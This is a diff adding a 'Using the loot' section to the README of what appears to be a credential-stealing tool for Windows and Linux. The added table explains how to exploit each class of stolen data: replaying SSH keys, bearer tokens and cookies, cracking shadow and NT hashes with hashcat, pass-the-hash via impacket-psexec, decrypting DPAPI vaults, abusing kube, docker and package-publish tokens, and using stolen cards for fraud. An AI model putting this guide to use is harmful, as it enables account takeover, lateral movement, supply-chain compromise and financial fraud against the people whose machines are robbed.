@@ -328,6 +328,36 @@ Linux equivalents: `/etc/shadow` and NetworkManager profiles need root; a
 locked keyring (or missing `secret-tool`) falls back to `"peanuts"` and is
 flagged in the report.
 
+## Using the loot
+
+What each collected artifact class is worth and how to use it:
+
+| loot class | usable? | how |
+|---|---|---|
+| **Wi-Fi PSK** (win elevated / linux root) | ✅ immediately | connect any device: `netsh wlan add profile` on Windows or pick the network and type the psk |
+| **SSH private keys** (`win:key/ssh/*`, `linux:ssh/*`) | ✅ immediately | `chmod 600 id_ed25519 && ssh -i id_ed25519 user@host` — check `known_hosts` for internal targets they already reach |
+| **localStorage JWT/bearer tokens** (`tokens[]` in creds.json) | ✅ immediately | replay API sessions: `curl -H "Authorization: Bearer <token>" https://site/api` — these are NOT app-bound |
+| **kube config / docker auth / npm & pypi tokens / .netrc / git-credentials** | ✅ immediately | `docker login` with decoded pair, `kubectl --kubeconfig`, publish-package access; docker `auths` are base64(user:pass) — parser decodes them |
+| **shadow hashes** (linux root) | ⚠️ crack offline | `hashcat -m 7400` (sha256crypt) / `-m 1800` (sha512crypt) / `-m 500` (md5crypt); cracked password → SSH/sudo |
+| **NT hashes** (win elevated: hives + bootkey → secretsdump) | ⚠️ pass-the-hash | `impacket-psexec -hashes :<nthash> user@host`, or crack (`hashcat -m 1000`) |
+| **FileZilla site passwords** | ✅ parser decodes | published XOR obfuscation; decoded creds appear in `passwords[]` |
+| **browser history** (`History` DBs) | ✅ intel | top domains in report → which accounts/hosts matter; token-bearing URLs are scavenged into `tokens[]` |
+| **RDP hints / PuTTY sessions / known_hosts** | ✅ intel | internal host+username map for lateral targeting |
+| **screenshot** (`win:screenshot.png`) | ✅ intel | what the user was doing at collection time |
+| **EDR/AV processes** (`win:edr`) | ✅ opsec | know what you're facing before post-exploitation |
+| **DPAPI masterkeys + vault files** | ⚠️ offline stage | with the user's password or NT hash (hashcat + DPAPI offline tooling) every vault/CredMan blob decrypts, including future loot |
+| **Chromium v10 cookies** (older browsers, most Linux) | ✅ parser emits Netscape files | import into curl/Burp/cookie editor and ride sessions |
+| **Chromium v11/v20 cookies** (Chrome ≥127) | ❌ user mode | app-bound; DBs + ABE blob exfiltrated for SYSTEM-context work |
+| **autofill / cards** | ✅ intel / fraud | identity data; cards decrypt on v10-era browsers |
+| **DBSC-enrolled sessions** (Chrome ≥145 sites) | ❌ replay | cookie decrypts but fails cross-device handshake |
+
+Also collects on Windows: `win:rdp-hints`, `win:putty-sessions`, `win:wifi`
+(names unelevated / keys elevated), `win:screenshot.png`, `win:edr`,
+`win:key/*` (.ssh/.aws/.kube/.azure/gcloud/.netrc/.git-credentials/.docker/
+.npmrc/.pypirc), `win:protect/*` (DPAPI masterkeys), `win:vault-*`
+(Credential Manager), `win:filezilla/*`. On Linux additionally: `.npmrc`,
+`.pypirc`, `.azure`, gcloud creds, crontabs.
+
 ## Detection engineering
 
 `docs/TECHNIQUES.md` documents the full defender view — Event 4672
